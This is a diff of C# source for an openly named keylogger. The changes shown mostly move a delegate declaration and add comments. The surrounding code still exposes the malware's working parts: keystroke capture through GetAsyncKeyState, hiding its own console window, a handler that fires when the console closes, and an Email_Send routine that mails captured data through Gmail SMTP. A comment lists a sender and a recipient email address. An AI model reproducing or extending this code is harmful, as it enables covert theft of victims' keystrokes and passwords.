@@ -10,7 +10,6 @@ namespace KeyLogger
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        private delegate bool ConsoleEventDelegate(int eventType);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);
@@ -25,8 +24,8 @@ namespace KeyLogger
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         const int SW_HIDE = 0;
-        const int SW_SHOW = 5;
-        public static void Email_Send()
+
+        public static void Email_Send() // send mail from icanmakeyoucryo.o@gmail.com to d1mnewz@gmail.com
         {
             MailMessage mail = new MailMessage();
             SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
@@ -46,6 +45,8 @@ namespace KeyLogger
             SmtpServer.Send(mail);
         }
 
+        private delegate bool ConsoleEventDelegate(int eventType);
+
         static bool ConsoleEventCallback(int eventType)
         {
             if (eventType == 2)
@@ -55,8 +56,10 @@ namespace KeyLogger
                 return true;
             }
             return false;
-        }
+        } // when console closes
+
         static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected
+
         static void HideWindow()
         {
             var handle = GetConsoleWindow();
@@ -68,7 +71,7 @@ namespace KeyLogger
         static void Main(string[] args)
         {
             HideWindow();
-            handler = new ConsoleEventDelegate(ConsoleEventCallback);
+            handler = new ConsoleEventDelegate(ConsoleEventCallback); // subscribe onclose event to ConsoleEventCallback
             SetConsoleCtrlHandler(handler, true);
             if (System.IO.File.Exists(filename))
             {
